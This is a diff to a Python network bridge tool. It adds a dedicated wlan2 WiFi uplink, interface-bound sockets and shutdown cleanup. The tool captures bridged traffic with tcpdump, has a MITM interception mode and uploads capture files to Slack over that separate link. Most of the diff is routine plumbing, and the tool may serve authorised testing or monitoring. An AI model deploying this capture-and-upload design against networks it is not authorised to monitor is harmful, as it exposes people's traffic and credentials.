@@ -26,6 +26,9 @@ CONFIG = {
     'MGMT_INTERFACES': ['wlan0', 'wlan1', 'wlan2', 'wlp', 'wifi'],
     'WIFI_AP_INTERFACE': 'wlan0',  # ALWAYS management AP - required when eth interfaces are in bridge mode
     'WIFI_CLIENT_INTERFACE': None,  # Auto-detect wlan1 or wlan2 for external communications (internet, Slack APIs)
+    'WLAN2_SSID': None,  # Hardcoded SSID for wlan2 auto-connect
+    'WLAN2_PASSWORD': None,  # Hardcoded password for wlan2 auto-connect
+    'WLAN2_AUTO_CONNECT': True,  # Auto-connect wlan2 at startup
     'BRIDGE_NAME': 'br0',
     'BRIDGE_IP': '10.200.66.1',  # IP for MITM interception
     'BRIDGE_IP_NETWORK': '10.200.66.0/24',  # Bridge network for route prioritization
@@ -1057,6 +1060,12 @@ class WiFiManager:
         self.gateway = None
         self.internet_available = False
         self.dns_manager = DNSManager()  # DNS conflict prevention
+        self.wlan2_interface = 'wlan2'  # Dedicated physical interface for internet
+        self.wlan2_connected = False
+        self.wlan2_ip = None
+        self.wlan2_gateway = None
+        self.wlan2_internet_available = False
+        self.wlan2_last_check = None
         
         # Auto-detect client interface on initialization
         detected = detect_wifi_client_interface()
@@ -1197,7 +1206,7 @@ class WiFiManager:
             log(f"AP scan failed: {e}", 'ERROR')
         return self.scan_results
 
-    def connect_to_ap(self, interface, ssid, password=None):
+    def connect_to_ap(self, interface, ssid, password=None, skip_routing=False):
         """Connect to WiFi AP using wpa_supplicant and systemd-networkd"""
         try:
             self.interface = interface
@@ -1251,11 +1260,19 @@ class WiFiManager:
             
             self.connected = True
             
-            # Step 7: Prevent DNS conflicts before setting up routing
-            self._prevent_dns_conflicts()
-            
-            # Step 8: Setup routing for internet access through WLAN
-            self._setup_wlan_routing(interface, dns_servers)
+            # For wlan2 (dedicated internet interface), skip complex routing
+            if skip_routing or interface == self.wlan2_interface:
+                log(f"Skipping routing setup for {interface} (using socket binding instead)", 'INFO')
+                # Just verify basic connectivity
+                if interface == self.wlan2_interface:
+                    self.wlan2_ip = self.ip_address
+                    self.wlan2_gateway = self.gateway
+            else:
+                # Step 7: Prevent DNS conflicts before setting up routing
+                self._prevent_dns_conflicts()
+                
+                # Step 8: Setup routing for internet access through WLAN (only for non-wlan2)
+                self._setup_wlan_routing(interface, dns_servers)
             
             # Step 9: Test internet
             self.internet_available = self.test_internet_connectivity()['connected']
@@ -2049,8 +2066,151 @@ class WiFiManager:
             'ssid': self.ssid,
             'ip_address': self.ip_address,
             'gateway': self.gateway,
-            'internet_available': self.internet_available
+            'internet_available': self.internet_available,
+            'wlan2': {
+                'connected': self.wlan2_connected,
+                'interface': self.wlan2_interface,
+                'ip_address': self.wlan2_ip,
+                'gateway': self.wlan2_gateway,
+                'internet_available': self.wlan2_internet_available,
+                'last_check': self.wlan2_last_check
+            }
         }
+    
+    def auto_connect_wlan2(self):
+        """Auto-connect wlan2 with hardcoded credentials"""
+        if not CONFIG.get('WLAN2_AUTO_CONNECT', True):
+            log("wlan2 auto-connect disabled", 'INFO')
+            return False
+        
+        ssid = CONFIG.get('WLAN2_SSID')
+        password = CONFIG.get('WLAN2_PASSWORD')
+        
+        if not ssid:
+            log("wlan2 SSID not configured, skipping auto-connect", 'WARNING')
+            return False
+        
+        log(f"Auto-connecting wlan2 to {ssid}...", 'INFO')
+        
+        # Check if wlan2 exists
+        result = run_cmd(['ip', 'link', 'show', self.wlan2_interface], check=False)
+        if not result or result.returncode != 0:
+            log(f"wlan2 interface not found", 'WARNING')
+            return False
+        
+        # Connect using existing method but skip routing setup
+        result = self.connect_to_ap(self.wlan2_interface, ssid, password, skip_routing=True)
+        
+        if result.get('success'):
+            self.wlan2_connected = True
+            self.wlan2_ip = self.ip_address if self.interface == self.wlan2_interface else None
+            self.wlan2_gateway = self.gateway if self.interface == self.wlan2_interface else None
+            
+            # Test internet connectivity
+            self.wlan2_internet_available = self.test_wlan2_internet()
+            self.wlan2_last_check = datetime.now().isoformat()
+            
+            log(f"wlan2 connected successfully. IP: {self.wlan2_ip}, Internet: {self.wlan2_internet_available}", 'SUCCESS')
+            return True
+        else:
+            log(f"wlan2 auto-connect failed: {result.get('error', 'Unknown error')}", 'ERROR')
+            return False
+    
+    def test_wlan2_internet(self):
+        """Test internet connectivity specifically from wlan2"""
+        if not self.wlan2_connected or not self.wlan2_ip:
+            return False
+        
+        try:
+            # Quick ping test
+            result = run_cmd(['ping', '-c', '1', '-W', '2', '-I', self.wlan2_interface, '8.8.8.8'], timeout=5, check=False)
+            if result and result.returncode == 0:
+                # Test DNS
+                result = run_cmd(['dig', '@8.8.8.8', '+short', '+timeout=2', 'google.com'], timeout=4, check=False)
+                if result and result.returncode == 0 and result.stdout.strip():
+                    return True
+            return False
+        except Exception as e:
+            log(f"wlan2 internet test error: {e}", 'WARNING')
+            return False
+
+# ============================================================================
+# SOCKET BINDING HELPER
+# ============================================================================
+
+def bind_socket_to_interface(sock, interface):
+    """Bind socket to specific network interface using SO_BINDTODEVICE"""
+    try:
+        import socket
+        # Get interface IP address
+        result = run_cmd(['ip', 'addr', 'show', interface], check=False)
+        if not result or result.returncode != 0:
+            log(f"Interface {interface} not found for socket binding", 'WARNING')
+            return False
+        
+        # Extract IP address
+        ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/\d+', result.stdout)
+        if not ip_match:
+            log(f"No IP address found on {interface}", 'WARNING')
+            return False
+        
+        interface_ip = ip_match.group(1)
+        
+        # Try SO_BINDTODEVICE first (requires root, works on Linux)
+        try:
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface.encode() + b'\0')
+            log(f"Socket bound to interface {interface} using SO_BINDTODEVICE", 'INFO')
+            return True
+        except (OSError, AttributeError):
+            # Fallback: bind to interface IP
+            try:
+                sock.bind((interface_ip, 0))
+                log(f"Socket bound to {interface} IP {interface_ip}", 'INFO')
+                return True
+            except Exception as e:
+                log(f"Failed to bind socket to {interface}: {e}", 'WARNING')
+                return False
+    except Exception as e:
+        log(f"Socket binding error: {e}", 'WARNING')
+        return False
+
+def create_bound_http_connection(url, interface='wlan2', timeout=10):
+    """Create HTTP connection bound to specific interface"""
+    try:
+        import socket
+        import http.client
+        from urllib.parse import urlparse
+        
+        parsed = urlparse(url)
+        host = parsed.hostname
+        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+        
+        # Create socket
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        
+        # Bind to interface
+        if not bind_socket_to_interface(sock, interface):
+            log(f"Warning: Could not bind to {interface}, connection may use wrong interface", 'WARNING')
+        
+        # Connect
+        sock.connect((host, port))
+        
+        # Wrap with SSL if HTTPS
+        if parsed.scheme == 'https':
+            import ssl
+            context = ssl.create_default_context()
+            sock = context.wrap_socket(sock, server_hostname=host)
+            conn = http.client.HTTPSConnection(host, port, timeout=timeout)
+            conn.sock = sock
+        else:
+            conn = http.client.HTTPConnection(host, port, timeout=timeout)
+            conn.sock = sock
+        
+        return conn
+    except Exception as e:
+        log(f"Failed to create bound HTTP connection: {e}", 'ERROR')
+        return None
 
 # ============================================================================
 # SLACK MANAGER
@@ -2109,17 +2269,47 @@ class SlackManager:
             data = json.dumps(test_message).encode('utf-8')
             log(f"Sending test message ({len(data)} bytes)...", 'INFO')
             
-            req = urllib.request.Request(webhook_url, data=data, headers={'Content-Type': 'application/json'})
-            log("Opening connection to Slack webhook...", 'INFO')
+            # Use bound connection to wlan2
+            wlan2_interface = 'wlan2'
+            if self.bridge_manager and self.bridge_manager.wifi_manager:
+                if self.bridge_manager.wifi_manager.wlan2_connected:
+                    wlan2_interface = self.bridge_manager.wifi_manager.wlan2_interface
             
-            with urllib.request.urlopen(req, timeout=10) as response:
+            log(f"Testing webhook via {wlan2_interface}...", 'INFO')
+            
+            # Create bound HTTP connection
+            conn = create_bound_http_connection(webhook_url, interface=wlan2_interface, timeout=10)
+            if not conn:
+                log("Failed to create bound connection, falling back to default", 'WARNING')
+                # Fallback to urllib
+                req = urllib.request.Request(webhook_url, data=data, headers={'Content-Type': 'application/json'})
+                with urllib.request.urlopen(req, timeout=10) as response:
+                    response_body = response.read().decode('utf-8')
+                    if response.status == 200:
+                        if response_body.strip() == 'ok':
+                            log("Webhook test successful! Message sent to Slack.", 'SUCCESS')
+                            return {'success': True, 'message': 'Webhook test successful', 'response': response_body}
+                        else:
+                            log(f"Webhook returned unexpected response: {response_body}", 'WARNING')
+                            return {'success': True, 'message': 'Webhook responded', 'response': response_body}
+                    else:
+                        error_msg = f'HTTP {response.status}: {response_body[:200]}'
+                        log(f"Webhook test failed: {error_msg}", 'ERROR')
+                        return {'success': False, 'error': error_msg, 'response': response_body}
+            
+            try:
+                # Extract path from webhook URL
+                path = '/services/' + '/'.join(webhook_url.split('/')[-2:])
+                conn.request('POST', path, data, {'Content-Type': 'application/json'})
+                response = conn.getresponse()
                 response_body = response.read().decode('utf-8')
+                
                 log(f"Webhook response: HTTP {response.status}", 'INFO')
                 log(f"Response body: {response_body[:200]}", 'INFO')
                 
                 if response.status == 200:
                     if response_body.strip() == 'ok':
-                        log("Webhook test successful! Message sent to Slack.", 'SUCCESS')
+                        log(f"Webhook test successful via {wlan2_interface}! Message sent to Slack.", 'SUCCESS')
                         return {'success': True, 'message': 'Webhook test successful', 'response': response_body}
                     else:
                         log(f"Webhook returned unexpected response: {response_body}", 'WARNING')
@@ -2128,6 +2318,8 @@ class SlackManager:
                     error_msg = f'HTTP {response.status}: {response_body[:200]}'
                     log(f"Webhook test failed: {error_msg}", 'ERROR')
                     return {'success': False, 'error': error_msg, 'response': response_body}
+            finally:
+                conn.close()
         except urllib.error.HTTPError as e:
             error_msg = f'HTTP {e.code}: {e.reason}'
             log(f"Webhook test failed: {error_msg}", 'ERROR')
@@ -2165,12 +2357,44 @@ class SlackManager:
             url = 'https://slack.com/api/auth.test'
             log(f"Calling Slack API: {url}", 'INFO')
             
-            data = urllib.parse.urlencode({'token': bot_token}).encode('utf-8')
-            req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+            # Use bound connection to wlan2
+            wlan2_interface = 'wlan2'
+            if self.bridge_manager and self.bridge_manager.wifi_manager:
+                if self.bridge_manager.wifi_manager.wlan2_connected:
+                    wlan2_interface = self.bridge_manager.wifi_manager.wlan2_interface
             
-            log("Sending auth.test request...", 'INFO')
-            with urllib.request.urlopen(req, timeout=10) as response:
+            log(f"Testing token via {wlan2_interface}...", 'INFO')
+            
+            data = urllib.parse.urlencode({'token': bot_token}).encode('utf-8')
+            
+            # Create bound HTTP connection
+            conn = create_bound_http_connection(url, interface=wlan2_interface, timeout=10)
+            if not conn:
+                log("Failed to create bound connection, falling back to default", 'WARNING')
+                # Fallback to urllib
+                req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+                with urllib.request.urlopen(req, timeout=10) as response:
+                    response_body = response.read().decode('utf-8')
+                    result = json.loads(response_body)
+                    if result.get('ok'):
+                        bot_info = {
+                            'user_id': result.get('user_id'),
+                            'team': result.get('team'),
+                            'user': result.get('user'),
+                            'team_id': result.get('team_id')
+                        }
+                        log(f"Token test successful! Bot ID: {result.get('user_id')}, Team: {result.get('team')}", 'SUCCESS')
+                        return {'success': True, 'bot_info': bot_info, 'raw_response': result}
+                    else:
+                        error_msg = result.get('error', 'Unknown error')
+                        log(f"Token test failed: {error_msg}", 'ERROR')
+                        return {'success': False, 'error': error_msg, 'raw_response': result}
+            
+            try:
+                conn.request('POST', '/api/auth.test', data, {'Content-Type': 'application/x-www-form-urlencoded'})
+                response = conn.getresponse()
                 response_body = response.read().decode('utf-8')
+                
                 log(f"API response: HTTP {response.status}", 'INFO')
                 
                 result = json.loads(response_body)
@@ -2183,12 +2407,14 @@ class SlackManager:
                         'user': result.get('user'),
                         'team_id': result.get('team_id')
                     }
-                    log(f"Token test successful! Bot ID: {result.get('user_id')}, Team: {result.get('team')}", 'SUCCESS')
+                    log(f"Token test successful via {wlan2_interface}! Bot ID: {result.get('user_id')}, Team: {result.get('team')}", 'SUCCESS')
                     return {'success': True, 'bot_info': bot_info, 'raw_response': result}
                 else:
                     error_msg = result.get('error', 'Unknown error')
                     log(f"Token test failed: {error_msg}", 'ERROR')
                     return {'success': False, 'error': error_msg, 'raw_response': result}
+            finally:
+                conn.close()
         except urllib.error.HTTPError as e:
             error_msg = f'HTTP {e.code}: {e.reason}'
             log(f"Token test failed: {error_msg}", 'ERROR')
@@ -2221,6 +2447,7 @@ class SlackManager:
         try:
             log("Sending heartbeat to Slack...", 'INFO')
             import urllib.request
+            import http.client
             
             status = 'online'
             capture_active = 'no'
@@ -2255,31 +2482,53 @@ class SlackManager:
             data = json.dumps(message).encode('utf-8')
             log(f"Prepared heartbeat message ({len(data)} bytes)", 'INFO')
             
-            req = urllib.request.Request(self.webhook_url, data=data, headers={'Content-Type': 'application/json'})
-            log(f"Sending heartbeat to {self.webhook_url[:50]}...", 'INFO')
+            # Use bound connection to wlan2
+            wlan2_interface = 'wlan2'
+            if self.bridge_manager and self.bridge_manager.wifi_manager:
+                if self.bridge_manager.wifi_manager.wlan2_connected:
+                    wlan2_interface = self.bridge_manager.wifi_manager.wlan2_interface
             
-            with urllib.request.urlopen(req, timeout=10) as response:
+            log(f"Sending heartbeat via {wlan2_interface}...", 'INFO')
+            
+            # Create bound HTTP connection
+            conn = create_bound_http_connection(self.webhook_url, interface=wlan2_interface, timeout=10)
+            if not conn:
+                log("Failed to create bound connection, falling back to default", 'WARNING')
+                # Fallback to urllib
+                req = urllib.request.Request(self.webhook_url, data=data, headers={'Content-Type': 'application/json'})
+                with urllib.request.urlopen(req, timeout=10) as response:
+                    response_body = response.read().decode('utf-8')
+                    if response.status == 200:
+                        self.last_heartbeat_time = datetime.now().isoformat()
+                        log(f"Heartbeat sent successfully! Response: {response_body[:100]}", 'SUCCESS')
+                        return True
+                    else:
+                        log(f"Heartbeat failed: HTTP {response.status} - {response_body[:200]}", 'ERROR')
+                        return False
+            
+            try:
+                # Extract path from webhook URL
+                from urllib.parse import urlparse
+                parsed = urlparse(self.webhook_url)
+                path = parsed.path
+                if not path:
+                    # Fallback: construct path from URL
+                    path = '/services/' + '/'.join(self.webhook_url.split('/')[-2:])
+                
+                conn.request('POST', path, data, {'Content-Type': 'application/json'})
+                response = conn.getresponse()
                 response_body = response.read().decode('utf-8')
+                
                 if response.status == 200:
                     self.last_heartbeat_time = datetime.now().isoformat()
-                    log(f"Heartbeat sent successfully! Response: {response_body[:100]}", 'SUCCESS')
+                    log(f"Heartbeat sent successfully via {wlan2_interface}! Response: {response_body[:100]}", 'SUCCESS')
                     return True
                 else:
                     log(f"Heartbeat failed: HTTP {response.status} - {response_body[:200]}", 'ERROR')
                     return False
-        except urllib.error.HTTPError as e:
-            error_msg = f'HTTP {e.code}: {e.reason}'
-            log(f"Heartbeat failed: {error_msg}", 'ERROR')
-            try:
-                error_body = e.read().decode('utf-8')
-                log(f"Heartbeat error response: {error_body[:200]}", 'ERROR')
-            except:
-                pass
-            return False
-        except urllib.error.URLError as e:
-            error_msg = f'Connection error: {str(e)}'
-            log(f"Heartbeat failed: {error_msg}", 'ERROR')
-            return False
+            finally:
+                conn.close()
+                
         except Exception as e:
             log(f"Heartbeat failed: {str(e)}", 'ERROR')
             import traceback
@@ -2344,14 +2593,41 @@ class SlackManager:
             body = b'\r\n'.join(body_parts)
             log(f"Form data prepared: {len(body) / 1024 / 1024:.2f} MB total", 'INFO')
             
-            req = urllib.request.Request(url, data=body)
-            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
+            # Use bound connection to wlan2
+            wlan2_interface = 'wlan2'
+            if self.bridge_manager and self.bridge_manager.wifi_manager:
+                if self.bridge_manager.wifi_manager.wlan2_connected:
+                    wlan2_interface = self.bridge_manager.wifi_manager.wlan2_interface
             
-            log(f"Uploading to Slack API: {url}", 'INFO')
+            log(f"Uploading to Slack API via {wlan2_interface}: {url}", 'INFO')
             log(f"Channel: {self.channel}, Timeout: 60s", 'INFO')
             
-            with urllib.request.urlopen(req, timeout=60) as response:
+            # Create bound HTTP connection
+            conn = create_bound_http_connection(url, interface=wlan2_interface, timeout=60)
+            if not conn:
+                log("Failed to create bound connection, falling back to default", 'WARNING')
+                # Fallback to urllib
+                req = urllib.request.Request(url, data=body)
+                req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
+                with urllib.request.urlopen(req, timeout=60) as response:
+                    response_body = response.read().decode('utf-8')
+                    result = json.loads(response_body)
+                    if result.get('ok'):
+                        file_info = result.get('file', {})
+                        file_url = file_info.get('url_private')
+                        file_id = file_info.get('id')
+                        log(f"File uploaded successfully! ID: {file_id}", 'SUCCESS')
+                        return {'success': True, 'file_url': file_url, 'file_id': file_id, 'raw_response': result}
+                    else:
+                        error_msg = result.get('error', 'Unknown error')
+                        log(f"File upload failed: {error_msg}", 'ERROR')
+                        return {'success': False, 'error': error_msg, 'raw_response': result}
+            
+            try:
+                conn.request('POST', '/api/files.upload', body, {'Content-Type': f'multipart/form-data; boundary={boundary}'})
+                response = conn.getresponse()
                 response_body = response.read().decode('utf-8')
+                
                 log(f"Upload response: HTTP {response.status}", 'INFO')
                 
                 result = json.loads(response_body)
@@ -2361,13 +2637,15 @@ class SlackManager:
                     file_info = result.get('file', {})
                     file_url = file_info.get('url_private')
                     file_id = file_info.get('id')
-                    log(f"File uploaded successfully! ID: {file_id}, URL: {file_url[:50]}..." if file_url and len(file_url) > 50 else f"File uploaded! ID: {file_id}", 'SUCCESS')
+                    log(f"File uploaded successfully via {wlan2_interface}! ID: {file_id}, URL: {file_url[:50]}..." if file_url and len(file_url) > 50 else f"File uploaded! ID: {file_id}", 'SUCCESS')
                     return {'success': True, 'file_url': file_url, 'file_id': file_id, 'raw_response': result}
                 else:
                     error_msg = result.get('error', 'Unknown error')
                     log(f"File upload failed: {error_msg}", 'ERROR')
                     log(f"Full response: {json.dumps(result)[:500]}", 'ERROR')
                     return {'success': False, 'error': error_msg, 'raw_response': result}
+            finally:
+                conn.close()
         except urllib.error.HTTPError as e:
             error_msg = f'HTTP {e.code}: {e.reason}'
             log(f"File upload failed: {error_msg}", 'ERROR')
@@ -2405,14 +2683,14 @@ class SlackManager:
             log("Upload skipped: channel not configured", 'WARNING')
             return
         
-        # Check internet connectivity
+        # Check internet connectivity via wlan2
         if self.bridge_manager and self.bridge_manager.wifi_manager:
-            if not self.bridge_manager.wifi_manager.internet_available:
-                log("Upload skipped: internet not available", 'WARNING')
-                log(f"WiFi connected: {self.bridge_manager.wifi_manager.connected}, Internet: {self.bridge_manager.wifi_manager.internet_available}", 'INFO')
+            if not self.bridge_manager.wifi_manager.wlan2_internet_available:
+                log("Upload skipped: wlan2 internet not available", 'WARNING')
+                log(f"wlan2 connected: {self.bridge_manager.wifi_manager.wlan2_connected}, Internet: {self.bridge_manager.wifi_manager.wlan2_internet_available}", 'INFO')
                 return
             else:
-                log(f"Internet connectivity verified: {self.bridge_manager.wifi_manager.interface} -> {self.bridge_manager.wifi_manager.gateway}", 'INFO')
+                log(f"Internet connectivity verified via wlan2: {self.bridge_manager.wifi_manager.wlan2_interface} -> {self.bridge_manager.wifi_manager.wlan2_gateway}", 'INFO')
         
         uploaded_files = []
         failed_files = []
@@ -2804,6 +3082,15 @@ class BridgeManager:
         self.auto_connect_wifi = False
         self.auto_enable_upload = False
         self.load_saved_config()
+        
+        # Auto-connect wlan2 at startup if configured
+        if CONFIG.get('WLAN2_AUTO_CONNECT', True) and CONFIG.get('WLAN2_SSID'):
+            log("Auto-connecting wlan2 at startup...", 'INFO')
+            threading.Thread(target=self.wifi_manager.auto_connect_wlan2, daemon=True).start()
+            
+            # Start periodic wlan2 internet check
+            self.wlan2_check_thread = threading.Thread(target=self._wlan2_internet_check_loop, daemon=True)
+            self.wlan2_check_thread.start()
 
     def detect_interfaces(self):
         """Detect ethernet interfaces (not wireless)"""
@@ -3120,6 +3407,74 @@ class BridgeManager:
 
         for iface in self.interfaces:
             run_cmd(['ip', 'link', 'set', iface, 'nomaster'])
+    
+    def cleanup_all(self):
+        """Comprehensive cleanup: stop capture, cleanup bridge, restore interfaces to normal mode"""
+        log("=== Starting Graceful Shutdown ===", 'INFO')
+        
+        try:
+            # Step 1: Stop capture if running
+            if self.tcpdump_process and self.tcpdump_process.poll() is None:
+                log("Stopping packet capture...", 'INFO')
+                self.stop_capture()
+            
+            # Step 2: Cleanup MITM if enabled
+            if self.mitm_manager.enabled:
+                log("Cleaning up MITM configuration...", 'INFO')
+                self.mitm_manager.cleanup()
+            
+            # Step 3: Disconnect WiFi if connected
+            if self.wifi_manager.connected:
+                log("Disconnecting WiFi...", 'INFO')
+                self.wifi_manager.disconnect_wifi()
+            
+            # Step 4: Stop Slack upload if running
+            if self.slack_manager.enabled:
+                log("Stopping Slack upload...", 'INFO')
+                self.slack_manager.stop_auto_upload()
+            
+            # Step 5: Cleanup bridge and restore interfaces
+            if self.bridge_initialized:
+                log("Cleaning up bridge and restoring interfaces...", 'INFO')
+                bridge = CONFIG['BRIDGE_NAME']
+                
+                # Bring bridge down
+                run_cmd(['ip', 'link', 'set', bridge, 'down'], check=False)
+                time.sleep(1)
+                
+                # Remove interfaces from bridge
+                for iface in self.interfaces:
+                    if iface:
+                        log(f"Removing {iface} from bridge...", 'INFO')
+                        run_cmd(['ip', 'link', 'set', iface, 'nomaster'], check=False)
+                        time.sleep(0.5)
+                
+                # Delete bridge
+                run_cmd(['ip', 'link', 'delete', bridge], check=False)
+                time.sleep(1)
+                
+                # Restore interfaces to normal mode
+                for iface in self.interfaces:
+                    if iface:
+                        log(f"Restoring {iface} to normal mode...", 'INFO')
+                        # Bring interface down first
+                        run_cmd(['ip', 'link', 'set', iface, 'down'], check=False)
+                        time.sleep(0.5)
+                        # Bring interface up (will allow normal network manager to take over)
+                        run_cmd(['ip', 'link', 'set', iface, 'up'], check=False)
+                        log(f"  ✓ {iface} restored to normal mode", 'SUCCESS')
+                
+                self.bridge_initialized = False
+                log("Bridge cleanup complete", 'SUCCESS')
+            
+            log("=== Graceful Shutdown Complete ===", 'SUCCESS')
+            return True
+            
+        except Exception as e:
+            log(f"Error during cleanup: {e}", 'ERROR')
+            import traceback
+            log(traceback.format_exc(), 'ERROR')
+            return False
 
     def get_status(self):
         """Get current status"""
@@ -3138,7 +3493,16 @@ class BridgeManager:
             'logs': self._get_logs(),
             'mitm': self.mitm_manager.get_status(),
             'wifi': self.wifi_manager.get_connection_status(),
-            'slack': self.slack_manager.get_upload_status()
+            'slack': self.slack_manager.get_upload_status(),
+            'wlan2': {
+                'connected': self.wifi_manager.wlan2_connected,
+                'interface': self.wifi_manager.wlan2_interface,
+                'ip_address': self.wifi_manager.wlan2_ip,
+                'gateway': self.wifi_manager.wlan2_gateway,
+                'internet_available': self.wifi_manager.wlan2_internet_available,
+                'last_check': self.wifi_manager.wlan2_last_check,
+                'ssid': CONFIG.get('WLAN2_SSID') if self.wifi_manager.wlan2_connected else None
+            }
         }
 
         if self.tcpdump_process and self.tcpdump_process.poll() is None:
@@ -3408,6 +3772,23 @@ class BridgeManager:
         except Exception:
             pass
         return []
+    
+    def _wlan2_internet_check_loop(self):
+        """Periodic background thread to check wlan2 internet connectivity"""
+        log("wlan2 internet check loop started", 'INFO')
+        while True:
+            try:
+                time.sleep(30)  # Check every 30 seconds
+                
+                if self.wifi_manager.wlan2_connected:
+                    internet_available = self.wifi_manager.test_wlan2_internet()
+                    if internet_available != self.wifi_manager.wlan2_internet_available:
+                        log(f"wlan2 internet status changed: {self.wifi_manager.wlan2_internet_available} -> {internet_available}", 'INFO')
+                    self.wifi_manager.wlan2_internet_available = internet_available
+                    self.wifi_manager.wlan2_last_check = datetime.now().isoformat()
+            except Exception as e:
+                log(f"wlan2 internet check error: {e}", 'WARNING')
+                time.sleep(30)
 
 # ============================================================================
 # WEB SERVER
@@ -4349,12 +4730,18 @@ def main():
             return
         shutdown_in_progress = True
 
-        log("Shutdown signal received...")
-        with capture_lock:
-            if bridge_manager.tcpdump_process:
-                bridge_manager.stop_capture()
-            if bridge_manager.mitm_manager.enabled:
-                bridge_manager.mitm_manager.cleanup()
+        log("Shutdown signal received (CTRL+C)...", 'INFO')
+        log("Performing graceful shutdown...", 'INFO')
+        
+        try:
+            # Comprehensive cleanup: stops capture, cleans MITM, disconnects WiFi, 
+            # tears down bridge, and restores eth interfaces to normal mode
+            with capture_lock:
+                bridge_manager.cleanup_all()
+        except Exception as e:
+            log(f"Error during shutdown: {e}", 'ERROR')
+        
+        log("Shutdown complete. Interfaces restored to normal mode.", 'SUCCESS')
         sys.exit(0)
 
     signal.signal(signal.SIGINT, signal_handler)
@@ -4398,12 +4785,15 @@ Press Ctrl+C to stop
         httpd.serve_forever()
     except KeyboardInterrupt:
         if not shutdown_in_progress:
-            log("Shutting down...")
-            with capture_lock:
-                bridge_manager.stop_capture()
-                if bridge_manager.mitm_manager.enabled:
-                    bridge_manager.mitm_manager.cleanup()
+            log("KeyboardInterrupt received, performing graceful shutdown...", 'INFO')
+            shutdown_in_progress = True
+            try:
+                with capture_lock:
+                    bridge_manager.cleanup_all()
+            except Exception as e:
+                log(f"Error during shutdown: {e}", 'ERROR')
         httpd.shutdown()
+        log("Web server stopped. Goodbye!", 'INFO')
         return 0
 
 if __name__ == '__main__':
